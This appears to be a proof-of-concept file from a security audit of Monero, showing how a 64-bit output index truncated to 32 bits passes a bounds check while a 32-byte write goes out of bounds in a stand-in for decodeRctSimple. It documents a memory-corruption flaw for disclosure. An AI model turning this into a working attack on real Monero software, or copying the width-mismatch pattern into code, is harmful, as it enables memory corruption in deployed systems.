// Finding 21 — the bounds check and the write target use different widths.
// src/tools.h:250 declares `unsigned int i`; src/page.h:3977 forms the mask
// reference with the full uint64_t. Monero checks `i`, then writes through `mask`.
#include <cstdio>
#include <cstdint>
#include <vector>
#include <array>
#include <stdexcept>

struct key { std::array<unsigned char,32> b{}; };
struct ecdhTuple { key mask; key amount; };

// Faithful stand-in for rct::decodeRctSimple's guard + write.
static void decodeRctSimple(const std::vector<ecdhTuple>& ecdhInfo,
                            unsigned int i, key& mask) {
    if (!(i < ecdhInfo.size()))
        throw std::runtime_error("Bad index");      // CHECK_AND_ASSERT_THROW_MES
    mask = ecdhInfo[i].mask;                        // the write
}

int main() {
    std::vector<ecdhTuple> ecdhInfo(2);             // a 2-output RingCT tx
    printf("ecdhInfo.size() = %zu, sizeof(ecdhTuple) = %zu\n\n",
           ecdhInfo.size(), sizeof(ecdhTuple));

    uint64_t attacker = 0x0000000100000000ULL;      // m_internal_output_index
    unsigned int truncated = (unsigned int)attacker;

    printf("attacker m_internal_output_index = 0x%016lx (%lu)\n", attacker, attacker);
    printf("  (A) passed as `unsigned int i` -> %u        <- what gets bounds-checked\n",
           truncated);
    printf("  (B) used to index ecdhInfo     -> %lu   <- what selects the memory\n",
           attacker);
    printf("  guard `i < size()` = %s\n", truncated < ecdhInfo.size() ? "PASSES" : "throws");
    printf("  byte offset of (B) = %lu * %zu = %lu bytes (%.0f GiB)\n\n",
           attacker, sizeof(ecdhTuple), attacker * sizeof(ecdhTuple),
           attacker * (double)sizeof(ecdhTuple) / (1024.0*1024*1024));

    printf("The two disagree, which is the defect. Demonstrating the guard is\n");
    printf("satisfied by the truncated value while the reference is out of bounds:\n");
    key& oob_ref = ecdhInfo[attacker].mask;   // UB: forms an out-of-bounds reference
    printf("  &ecdhInfo[0].mask        = %p\n", (void*)&ecdhInfo[0].mask);
    printf("  &ecdhInfo[attacker].mask = %p  <- target of `mask = ...`\n", (void*)&oob_ref);
    fflush(stdout);

    try { decodeRctSimple(ecdhInfo, truncated, oob_ref); }
    catch (const std::exception& e) { printf("  guard threw: %s\n", e.what()); return 0; }
    printf("  guard passed and 32 bytes were written to the out-of-bounds address\n");
    return 0;
}
